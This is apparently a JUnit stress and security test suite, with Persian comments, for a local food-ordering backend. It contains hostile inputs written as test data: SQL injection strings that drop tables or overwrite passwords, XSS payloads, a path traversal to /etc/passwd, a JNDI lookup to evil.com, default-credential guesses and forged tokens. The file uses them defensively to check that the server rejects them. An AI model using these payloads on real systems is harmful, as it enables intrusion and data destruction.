package com.myapp.stress;

import com.myapp.common.TestDatabaseManager;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Timeout;

import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.URI;
import java.time.Duration;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.*;
import java.util.stream.IntStream;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;

import static org.junit.jupiter.api.Assertions.*;

/**
 * تست‌های فشار و چالش برای Backend
 * این تست‌ها سیستم را در شرایط سخت و حدی آزمایش می‌کنند
 * نسخه Vanilla Java (بدون Spring Boot)
 */
public class AdvancedStressTest {

    private static final String BASE_URL = "http://localhost:8081";
    private HttpClient httpClient;
    private TestDatabaseManager dbManager;

    @BeforeEach
    void setUp() {
        httpClient = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(10))
                .build();
        dbManager = new TestDatabaseManager();
        dbManager.cleanup();
        dbManager.setupTestDatabase();
    }

    @AfterEach
    void tearDown() {
        dbManager.cleanup();
    }

    /**
     * تست فشار بالا: 1000 درخواست همزمان
     * این تست سیستم را با بار سنگین به چالش می‌کشد
     */
    @Test
    @Timeout(value = 120, unit = TimeUnit.SECONDS)
    void testHighConcurrentLoad() throws InterruptedException {
        System.out.println("🔥 Starting High Concurrent Load Test with 1000 requests...");
        
        int threadCount = 50;
        int requestsPerThread = 20;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch latch = new CountDownLatch(threadCount);
        
        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger failureCount = new AtomicInteger(0);
        AtomicLong totalResponseTime = new AtomicLong(0);
        ConcurrentLinkedQueue<String> errors = new ConcurrentLinkedQueue<>();

        for (int i = 0; i < threadCount; i++) {
            final int threadId = i;
            executor.submit(() -> {
                try {
                    for (int j = 0; j < requestsPerThread; j++) {
                        long startTime = System.currentTimeMillis();
                        
                        try {
                            // مخلوط کردن انواع مختلف درخواست‌ها
                            switch (j % 6) {
                                case 0:
                                    testHealthEndpoint();
                                    break;
                                case 1:
                                    testTestEndpoint();
                                    break;
                                case 2:
                                    testUserRegistrationEndpoint(threadId, j);
                                    break;
                                case 3:
                                    testUserLoginEndpoint(threadId, j);
                                    break;
                                case 4:
                                    testRestaurantEndpoints();
                                    break;
                                case 5:
                                    testOrderEndpoints();
                                    break;
                            }
                            successCount.incrementAndGet();
                        } catch (Exception e) {
                            failureCount.incrementAndGet();
                            errors.offer("Thread " + threadId + " Request " + j + ": " + e.getMessage());
                        }
                        
                        long endTime = System.currentTimeMillis();
                        totalResponseTime.addAndGet(endTime - startTime);
                    }
                } finally {
                    latch.countDown();
                }
            });
        }

        assertTrue(latch.await(100, TimeUnit.SECONDS), "All requests should complete within timeout");
        executor.shutdown();

        int totalRequests = threadCount * requestsPerThread;
        double successRate = (double) successCount.get() / totalRequests * 100;
        double averageResponseTime = (double) totalResponseTime.get() / totalRequests;

        System.out.printf("📊 High Load Test Results:\n");
        System.out.printf("   Total Requests: %d\n", totalRequests);
        System.out.printf("   Successful: %d (%.2f%%)\n", successCount.get(), successRate);
        System.out.printf("   Failed: %d\n", failureCount.get());
        System.out.printf("   Average Response Time: %.2f ms\n", averageResponseTime);

        // تحلیل خطاها
        if (!errors.isEmpty()) {
            System.out.println("🚨 Error Analysis:");
            Map<String, Integer> errorCounts = new HashMap<>();
            errors.forEach(error -> {
                String errorType = extractErrorType(error);
                errorCounts.put(errorType, errorCounts.getOrDefault(errorType, 0) + 1);
            });
            errorCounts.forEach((error, count) -> 
                System.out.printf("   %s: %d times\n", error, count));
        }

        // حداقل 70% درخواست‌ها باید موفق باشند
        assertTrue(successRate >= 70.0, 
            "Success rate should be at least 70%, but was: " + successRate + "%");
        
        // Response time نباید خیلی زیاد باشد
        assertTrue(averageResponseTime < 10000, 
            "Average response time should be under 10 seconds, but was: " + averageResponseTime + "ms");
    }

    /**
     * تست Edge Cases: داده‌های نامعمول و حدی
     */
    @Test
    void testEdgeCasesAndBoundaryValues() {
        System.out.println("🎯 Testing Edge Cases and Boundary Values...");

        // تست با رشته‌های خیلی طولانی
        testVeryLongStrings();
        
        // تست با کاراکترهای خاص
        testSpecialCharacters();
        
        // تست با داده‌های تهی
        testEmptyAndNullData();
        
        // تست با عددهای حدی
        testBoundaryNumbers();
        
        // تست با فرمت‌های نامعتبر
        testInvalidFormats();
        
        System.out.println("✅ Edge Cases Testing Completed");
    }

    /**
     * تست امنیتی: تلاش برای نفوذ و حملات
     */
    @Test
    void testSecurityPenetration() {
        System.out.println("🔒 Testing Security Penetration...");

        // SQL Injection attempts
        testSQLInjectionPrevention();
        
        // XSS attempts
        testXSSPrevention();
        
        // Authentication bypass attempts
        testAuthenticationBypass();
        
        // Data exposure attempts
        testDataExposurePrevention();
        
        System.out.println("✅ Security Penetration Testing Completed");
    }

    /**
     * تست فساد داده: ارسال داده‌های خراب
     */
    @Test
    void testDataCorruption() {
        System.out.println("💥 Testing Data Corruption Scenarios...");

        // تست با JSON خراب
        testCorruptedJSON();
        
        // تست با encoding اشتباه
        testWrongEncoding();
        
        // تست با داده‌های باینری
        testBinaryDataInjection();
        
        // تست با ساختار نامعتبر
        testInvalidDataStructures();
        
        System.out.println("✅ Data Corruption Testing Completed");
    }

    /**
     * تست حافظه: شناسایی نشت حافظه
     */
    @Test
    @Timeout(value = 180, unit = TimeUnit.SECONDS)
    void testMemoryLeakage() throws InterruptedException {
        System.out.println("🧠 Testing Memory Leakage...");

        Runtime runtime = Runtime.getRuntime();
        long initialMemory = runtime.totalMemory() - runtime.freeMemory();
        
        System.out.printf("Initial Memory Usage: %d MB\n", initialMemory / 1024 / 1024);

        // تولید بار سنگین برای تست نشت حافظه
        for (int i = 0; i < 300; i++) {
            final int iteration = i; // Make variable effectively final for lambda
            try {
                // ایجاد چندین درخواست همزمان
                CompletableFuture.allOf(
                    CompletableFuture.runAsync(this::testHealthEndpoint),
                    CompletableFuture.runAsync(this::testTestEndpoint),
                    CompletableFuture.runAsync(() -> testUserRegistrationEndpoint(999, iteration)),
                    CompletableFuture.runAsync(this::testRestaurantEndpoints)
                ).get(10, TimeUnit.SECONDS);
                
                // هر 30 iteration حافظه را چک کن
                if (i % 30 == 0) {
                    System.gc(); // Force garbage collection
                    Thread.sleep(200); // Wait for GC
                    
                    long currentMemory = runtime.totalMemory() - runtime.freeMemory();
                    long memoryIncrease = currentMemory - initialMemory;
                    
                    System.out.printf("Iteration %d - Memory: %d MB (Increase: %d MB)\n", 
                        iteration, currentMemory / 1024 / 1024, memoryIncrease / 1024 / 1024);
                    
                    // اگر حافظه بیش از 150MB افزایش یافت، احتمال memory leak
                    if (memoryIncrease > 150 * 1024 * 1024) {
                        System.err.println("⚠️  Potential memory leak detected!");
                        break;
                    }
                }
                
                            } catch (Exception e) {
                System.err.println("Error in memory test iteration " + iteration + ": " + e.getMessage());
            }
        }

        System.out.println("✅ Memory Leakage Testing Completed");
    }

    // ========== Helper Methods برای HTTP درخواست‌ها ==========

    private void testHealthEndpoint() {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/health"))
                    .timeout(Duration.ofSeconds(5))
                    .GET()
                    .build();

            HttpResponse<String> response = httpClient.send(request, 
                    HttpResponse.BodyHandlers.ofString());
            
            assertTrue(response.statusCode() >= 200 && response.statusCode() < 500);
        } catch (Exception e) {
            throw new RuntimeException("Health endpoint failed: " + e.getMessage(), e);
        }
    }

    private void testTestEndpoint() {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/api/test"))
                    .timeout(Duration.ofSeconds(5))
                    .GET()
                    .build();

            HttpResponse<String> response = httpClient.send(request, 
                    HttpResponse.BodyHandlers.ofString());
            
            assertTrue(response.statusCode() >= 200 && response.statusCode() < 500);
        } catch (Exception e) {
            throw new RuntimeException("Test endpoint failed: " + e.getMessage(), e);
        }
    }

    private void testUserRegistrationEndpoint(int threadId, int requestId) {
        try {
            String userJson = String.format(
                "{\"fullName\":\"StressUser_%d_%d\",\"phone\":\"+98901%07d\",\"password\":\"stress123\",\"email\":\"stress_%d_%d@test.com\"}", 
                threadId, requestId, (threadId * 1000 + requestId), threadId, requestId);
            
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/api/auth/register"))
                    .timeout(Duration.ofSeconds(10))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(userJson))
                    .build();

            HttpResponse<String> response = httpClient.send(request, 
                    HttpResponse.BodyHandlers.ofString());
            
            assertTrue(response.statusCode() >= 200 && response.statusCode() < 500);
        } catch (Exception e) {
            throw new RuntimeException("Registration failed: " + e.getMessage(), e);
        }
    }

    private void testUserLoginEndpoint(int threadId, int requestId) {
        try {
            String loginJson = String.format(
                "{\"phone\":\"+98901%07d\",\"password\":\"stress123\"}", 
                (threadId * 1000 + requestId));
            
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/api/auth/login"))
                    .timeout(Duration.ofSeconds(10))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(loginJson))
                    .build();

            HttpResponse<String> response = httpClient.send(request, 
                    HttpResponse.BodyHandlers.ofString());
            
            assertTrue(response.statusCode() >= 200 && response.statusCode() < 500);
        } catch (Exception e) {
            throw new RuntimeException("Login failed: " + e.getMessage(), e);
        }
    }

    private void testRestaurantEndpoints() {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/api/restaurants/"))
                    .timeout(Duration.ofSeconds(5))
                    .GET()
                    .build();

            HttpResponse<String> response = httpClient.send(request, 
                    HttpResponse.BodyHandlers.ofString());
            
            assertTrue(response.statusCode() >= 200 && response.statusCode() < 500);
        } catch (Exception e) {
            throw new RuntimeException("Restaurant endpoint failed: " + e.getMessage(), e);
        }
    }

    private void testOrderEndpoints() {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/api/orders/"))
                    .timeout(Duration.ofSeconds(5))
                    .GET()
                    .build();

            HttpResponse<String> response = httpClient.send(request, 
                    HttpResponse.BodyHandlers.ofString());
            
            assertTrue(response.statusCode() >= 200 && response.statusCode() < 500);
        } catch (Exception e) {
            throw new RuntimeException("Order endpoint failed: " + e.getMessage(), e);
        }
    }

    // ========== Edge Cases Test Methods ==========

    private void testVeryLongStrings() {
        try {
            // رشته 50000 کاراکتری
            String veryLongString = "A".repeat(50000);
            String userJson = String.format(
                "{\"fullName\":\"%s\",\"phone\":\"+989123456789\",\"password\":\"pass123\"}", 
                veryLongString);
            
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/api/auth/register"))
                    .timeout(Duration.ofSeconds(15))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(userJson))
                    .build();

            HttpResponse<String> response = httpClient.send(request, 
                    HttpResponse.BodyHandlers.ofString());
            
            // سیستم باید این را reject کند یا handle کند
            assertTrue(response.statusCode() == 400 || response.statusCode() == 413 || 
                      response.statusCode() == 201 || response.statusCode() == 500);
            
                    } catch (Exception e) {
                // Exception مناسب باشد
                assertFalse(e.getClass().equals(OutOfMemoryError.class), "Should not cause OutOfMemoryError");
                assertFalse(e.getCause() instanceof OutOfMemoryError, "Should not cause OutOfMemoryError");
            }
    }

    private void testSpecialCharacters() {
        String[] specialChars = {
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "null\u0000byte",
            "unicode\u202eMockery",
            "emoji🔥💥🚀test",
            "\n\r\t injection",
            "%%injection%%",
            "{{template}}injection"
        };

        for (String specialChar : specialChars) {
            try {
                String userJson = String.format(
                    "{\"fullName\":\"%s\",\"phone\":\"+989123456789\",\"password\":\"pass123\"}", 
                    specialChar.replace("\"", "\\\""));
                
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(userJson))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // سیستم نباید crash کند
                assertNotNull(response);
                assertTrue(response.statusCode() >= 200 && response.statusCode() < 600);
                
            } catch (Exception e) {
                // اگر exception پرت شد، باید مناسب باشد نه NullPointer
                assertFalse(e instanceof NullPointerException, 
                    "Should not throw NullPointerException for: " + specialChar);
            }
        }
    }

    private void testEmptyAndNullData() {
        String[] testCases = {
            "{}",
            "{\"fullName\":\"\",\"phone\":\"\",\"password\":\"\"}",
            "{\"fullName\":null,\"phone\":null,\"password\":null}",
            "",
            "null",
            "   ",
            "{\"fullName\":\"   \",\"phone\":\"   \",\"password\":\"   \"}"
        };

        for (String testCase : testCases) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(testCase))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // باید proper validation error برگرداند یا connection error
                // اگر Backend فعال نیست، status codes مختلفی ممکن است برگردد
                assertTrue(response.statusCode() >= 200 && response.statusCode() < 600, 
                    "Unexpected status code: " + response.statusCode());
                
                System.out.printf("📊 Empty/Null data test case '%s' -> Status: %d\n", 
                    testCase.length() > 20 ? testCase.substring(0, 20) + "..." : testCase, 
                    response.statusCode());
                
            } catch (Exception e) {
                // Exception handling مناسب باشد (بخصوص connection errors)
                assertTrue(e.getMessage() != null && !e.getMessage().isEmpty());
                System.out.printf("⚠️  Connection exception for test case '%s': %s\n", 
                    testCase.length() > 20 ? testCase.substring(0, 20) + "..." : testCase,
                    e.getClass().getSimpleName());
            }
        }
    }

    private void testBoundaryNumbers() {
        long[] testNumbers = {
            Long.MAX_VALUE,
            Long.MIN_VALUE,
            0,
            -1,
            Integer.MAX_VALUE,
            Integer.MIN_VALUE,
            999999999999L,
            -999999999999L
        };

        for (long number : testNumbers) {
            try {
                String orderJson = String.format(
                    "{\"restaurantId\":%d,\"items\":[],\"totalAmount\":%d}", 
                    number % 1000, number % 10000);
                
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/orders/"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(orderJson))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                assertNotNull(response);
                assertTrue(response.statusCode() >= 200 && response.statusCode() < 600);
                
            } catch (Exception e) {
                // Numeric overflow نباید سیستم را crash کند
                assertFalse(e instanceof ArithmeticException);
                assertFalse(e instanceof NumberFormatException);
            }
        }
    }

    private void testInvalidFormats() {
        String[] invalidJsons = {
            "{invalid json",
            "{'single': 'quotes'}",
            "{\"trailing\": \"comma\",}",
            "{\"duplicate\":1,\"duplicate\":2}",
            "not json at all",
            "[1,2,3]", // Array instead of object
            "123", // Number instead of object
            "\"string\"", // String instead of object
            "{\"nested\":{\"deeply\":{\"very\":{\"deep\":true}}}}",
            "{\"\\u0000\":\"null byte\"}",
            "{\"key\":undefined}"
        };

        for (String invalidJson : invalidJsons) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(invalidJson))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // باید proper JSON parsing error برگرداند
                assertTrue(response.statusCode() == 400 || response.statusCode() == 500);
                
            } catch (Exception e) {
                // JSON parsing exception مناسب باشد
                assertTrue(e.getMessage().toLowerCase().contains("json") || 
                          e.getMessage().toLowerCase().contains("parse") ||
                          e.getMessage().toLowerCase().contains("malformed"));
            }
        }
    }

    // ========== Security Penetration Test Methods ==========

    private void testSQLInjectionPrevention() {
        String[] sqlInjections = {
            "admin'; DROP TABLE users; --",
            "1' OR '1'='1",
            "'; UNION SELECT * FROM users --",
            "admin'/**/OR/**/1=1#",
            "'; INSERT INTO users VALUES('hacker','pass'); --",
            "1'; UPDATE users SET password='hacked' WHERE id=1; --",
            "' OR 1=1 LIMIT 1 OFFSET 1 --",
            "'; DELETE FROM orders; --"
        };

        for (String injection : sqlInjections) {
            try {
                // تست در URL parameter
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/restaurants/" + injection))
                        .timeout(Duration.ofSeconds(10))
                        .GET()
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // SQL injection نباید موفق شود
                assertTrue(response.statusCode() == 400 || response.statusCode() == 404 ||
                          response.statusCode() == 500);
                
                // تست در JSON body
                String userJson = String.format(
                    "{\"fullName\":\"%s\",\"phone\":\"+989123456789\",\"password\":\"pass123\"}", 
                    injection.replace("\"", "\\\""));
                
                HttpRequest request2 = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(userJson))
                        .build();

                HttpResponse<String> response2 = httpClient.send(request2, 
                        HttpResponse.BodyHandlers.ofString());
                
                // Response نباید database errors لو دهد
                String responseBody = response2.body().toLowerCase();
                assertFalse(responseBody.contains("sql"));
                assertFalse(responseBody.contains("database"));
                assertFalse(responseBody.contains("sqlite"));
                assertFalse(responseBody.contains("hibernate"));
                
            } catch (Exception e) {
                // SQL exceptions نباید به user برسد
                assertFalse(e.getMessage().toLowerCase().contains("sql"));
            }
        }
    }

    private void testXSSPrevention() {
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "\"><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<ScRiPt>alert('XSS')</ScRiPt>"
        };

        for (String xss : xssPayloads) {
            try {
                String userJson = String.format(
                    "{\"fullName\":\"%s\",\"phone\":\"+989123456789\",\"password\":\"pass123\"}", 
                    xss.replace("\"", "\\\""));
                
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(userJson))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // اگر successful بود، response نباید raw XSS داشته باشد
                if (response.statusCode() >= 200 && response.statusCode() < 300) {
                    String responseBody = response.body();
                    assertFalse(responseBody.contains("<script>"));
                    assertFalse(responseBody.contains("javascript:"));
                    assertFalse(responseBody.contains("onerror="));
                    assertFalse(responseBody.contains("onload="));
                }
                
            } catch (Exception e) {
                // XSS نباید runtime exceptions ایجاد کند
                assertFalse(e instanceof SecurityException);
            }
        }
    }

    private void testAuthenticationBypass() {
        String[] bypassAttempts = {
            "admin",
            "administrator", 
            "root",
            "system",
            "guest",
            "anonymous",
            "test",
            "demo",
            "user",
            "default"
        };

        for (String username : bypassAttempts) {
            try {
                String loginJson = String.format(
                    "{\"phone\":\"%s\",\"password\":\"%s\"}", 
                    username, username);
                
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/login"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(loginJson))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // Default credentials نباید کار کنند
                assertTrue(response.statusCode() == 401 || response.statusCode() == 400);
                
            } catch (Exception e) {
                // Authentication bypass نباید system errors ایجاد کند
                assertFalse(e.getMessage().toLowerCase().contains("internal"));
            }
        }

        // تست Token manipulation
        String[] invalidTokens = {
            "Bearer fake_token",
            "Bearer ",
            "Basic YWRtaW46YWRtaW4=", // admin:admin base64
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature",
            "Bearer null",
            "Bearer undefined",
            "Bearer {\"user\":\"admin\"}"
        };

        for (String token : invalidTokens) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/validate"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Authorization", token)
                        .GET()
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // Invalid tokens نباید access بدهند
                assertTrue(response.statusCode() == 401 || response.statusCode() == 403);
                
            } catch (Exception e) {
                // Token manipulation نباید server crash کند
                assertFalse(e instanceof SecurityException);
            }
        }
    }

    private void testDataExposurePrevention() {
        String[] sensitiveEndpoints = {
            "/api/admin/",
            "/api/admin/users",
            "/api/admin/dashboard",
            "/api/admin/transactions",
            "/api/users/",
            "/api/payments/",
            "/api/orders/",
            "/health",
            "/api/test"
        };

        for (String endpoint : sensitiveEndpoints) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + endpoint))
                        .timeout(Duration.ofSeconds(10))
                        .GET()
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                String responseBody = response.body().toLowerCase();
                
                // Response نباید sensitive information لو دهد
                assertFalse(responseBody.contains("password"));
                assertFalse(responseBody.contains("secret"));
                assertFalse(responseBody.contains("private"));
                assertFalse(responseBody.contains("token") && responseBody.contains("jwt"));
                assertFalse(responseBody.contains("stacktrace"));
                assertFalse(responseBody.contains("exception"));
                assertFalse(responseBody.contains("database url"));
                assertFalse(responseBody.contains("connection string"));
                
            } catch (Exception e) {
                // Error messages نباید sensitive info داشته باشند
                String errorMsg = e.getMessage().toLowerCase();
                assertFalse(errorMsg.contains("password"));
                assertFalse(errorMsg.contains("database"));
            }
        }
    }

    // ========== Data Corruption Test Methods ==========

    private void testCorruptedJSON() {
        byte[][] corruptedData = {
            {(byte)0xFF, (byte)0xFE}, // BOM
            {(byte)0x00, (byte)0x01, (byte)0x02}, // Binary data
            "{\"test\":\"\\uFFFF\"}".getBytes(StandardCharsets.UTF_8), // Invalid unicode
            "{\"test\":\"\\u0000\"}".getBytes(StandardCharsets.UTF_8), // Null character
            new byte[]{'{', '"', 't', 'e', 's', 't', '"', ':', (byte)0x80, '}'}
        };

        for (byte[] data : corruptedData) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofByteArray(data))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // Corrupted data نباید server crash کند
                assertTrue(response.statusCode() >= 400 && response.statusCode() < 600);
                
            } catch (Exception e) {
                // Encoding errors مناسب باشند
                assertFalse(e.getClass().equals(OutOfMemoryError.class));
                assertFalse(e.getClass().equals(StackOverflowError.class));
            }
        }
    }

    private void testWrongEncoding() {
        String[] encodingTests = {
            "UTF-16",
            "ISO-8859-1", 
            "Windows-1252",
            "UTF-32"
        };

        String jsonData = "{\"fullName\":\"تست فارسی\",\"phone\":\"+989123456789\",\"password\":\"pass123\"}";

        for (String encoding : encodingTests) {
            try {
                byte[] encodedData = jsonData.getBytes(encoding);
                
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json; charset=" + encoding)
                        .POST(HttpRequest.BodyPublishers.ofByteArray(encodedData))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // Wrong encoding نباید system corrupt کند
                assertNotNull(response);
                
            } catch (Exception e) {
                // Encoding mismatch نباید fatal errors ایجاد کند
                assertFalse(e.getCause() instanceof OutOfMemoryError);
            }
        }
    }

    private void testBinaryDataInjection() {
        // تولید random binary data
        Random random = new Random();
        for (int i = 0; i < 10; i++) {
            byte[] randomData = new byte[1024 + random.nextInt(4096)];
            random.nextBytes(randomData);
            
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(10))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofByteArray(randomData))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // Binary data نباید server crash کند
                assertTrue(response.statusCode() >= 400);
                
            } catch (Exception e) {
                // Binary injection نباید memory errors ایجاد کند
                assertFalse(e.getClass().equals(OutOfMemoryError.class));
                assertFalse(e.getClass().equals(StackOverflowError.class));
            }
        }
    }

    private void testInvalidDataStructures() {
        String[] invalidStructures = {
            "{\"circular\":{\"ref\":\"{\\\"circular\\\":{\\\"ref\\\":\\\"...\\\"}}\"}}", // Simulated circular reference
            "{" + "\"nested\":".repeat(1000) + "true" + "}".repeat(1000), // Deeply nested
            "{\"array\":[" + "1,".repeat(10000) + "1]}", // Very large array
            "{\"keys\":" + "{\"key%d\":true,".repeat(1000).formatted(0) + "\"final\":true}}", // Many keys
            "{\"unicode\":\"\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\\u0008\\u0009\\u000A\"}", // Control characters
            "{\"zero_width\":\"text\\u200Bwith\\u200Czero\\u200Dwidth\\uFEFFchars\"}" // Zero-width characters
        };

        for (String invalidStructure : invalidStructures) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/api/auth/register"))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(invalidStructure))
                        .build();

                HttpResponse<String> response = httpClient.send(request, 
                        HttpResponse.BodyHandlers.ofString());
                
                // Invalid structures نباید infinite loops یا stack overflow ایجاد کنند
                assertNotNull(response);
                
            } catch (Exception e) {
                // Structure parsing نباید fatal errors ایجاد کند
                assertFalse(e.getClass().equals(StackOverflowError.class));
                assertFalse(e.getClass().equals(OutOfMemoryError.class));
            }
        }
    }

    // ========== Utility Methods ==========

    private String extractErrorType(String errorMessage) {
        if (errorMessage.contains("timeout")) return "Timeout";
        if (errorMessage.contains("connection")) return "Connection Error";
        if (errorMessage.contains("json") || errorMessage.contains("parse")) return "JSON Error";
        if (errorMessage.contains("auth")) return "Authentication Error";
        if (errorMessage.contains("404")) return "Not Found";
        if (errorMessage.contains("500")) return "Server Error";
        if (errorMessage.contains("400")) return "Bad Request";
        return "Other: " + errorMessage.substring(0, Math.min(50, errorMessage.length()));
    }
} 